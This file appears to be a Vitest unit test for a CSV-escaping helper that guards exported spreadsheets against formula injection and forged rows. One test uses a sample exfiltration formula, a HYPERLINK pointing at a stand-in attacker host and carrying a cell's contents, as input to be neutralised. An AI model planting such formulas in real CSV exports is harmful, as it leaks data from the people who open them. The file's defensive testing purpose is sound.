import { describe, expect, it } from 'vitest';
// api/** is excluded from the vitest project (see vitest.config.ts), so the
// serverless helpers are exercised from here instead of going untested.
import { escapeCsv } from '../../../api/_lib/csv';

describe('escapeCsv', () => {
  it('leaves an ordinary value untouched', () => {
    expect(escapeCsv('connection reset')).toBe('connection reset');
  });

  it('returns an empty string unchanged', () => {
    expect(escapeCsv('')).toBe('');
  });

  it.each([
    ['=1+1', "'=1+1"],
    ['+1234567890', "'+1234567890"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1:A9)', "'@SUM(A1:A9)"]
  ])('prefixes the formula trigger %s', (input, expected) => {
    expect(escapeCsv(input)).toBe(expected);
  });

  it('neutralises a formula hidden behind a leading tab', () => {
    // A leading tab is stripped by the spreadsheet before it decides whether
    // the cell is a formula, so it must be caught here too. The tab then forces
    // quoting is not required (tab is not a CSV delimiter here), but the
    // apostrophe must be present.
    expect(escapeCsv('\t=1+1')).toBe("'\t=1+1");
  });

  it('neutralises a formula hidden behind a leading carriage return', () => {
    expect(escapeCsv('\r=1+1')).toBe('"\'\r=1+1"');
  });

  it('neutralises the exfiltration case and still quotes the commas', () => {
    const attack = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
    const escaped = escapeCsv(attack);

    expect(escaped.startsWith('"\'=')).toBe(true);
    // Quotes inside the value are doubled so the cell cannot be broken out of.
    expect(escaped).toContain('""http://evil.example/?x=""');
  });

  it('quotes and doubles embedded quotes', () => {
    expect(escapeCsv('he said "no"')).toBe('"he said ""no"""');
  });

  it('quotes values containing a comma', () => {
    expect(escapeCsv('reset all, then retry')).toBe('"reset all, then retry"');
  });

  it('quotes values containing a newline so a row cannot be forged', () => {
    expect(escapeCsv('line one\nline two')).toBe('"line one\nline two"');
  });

  it('does not prefix a value where the trigger is not leading', () => {
    expect(escapeCsv('total=1+1')).toBe('total=1+1');
  });
});
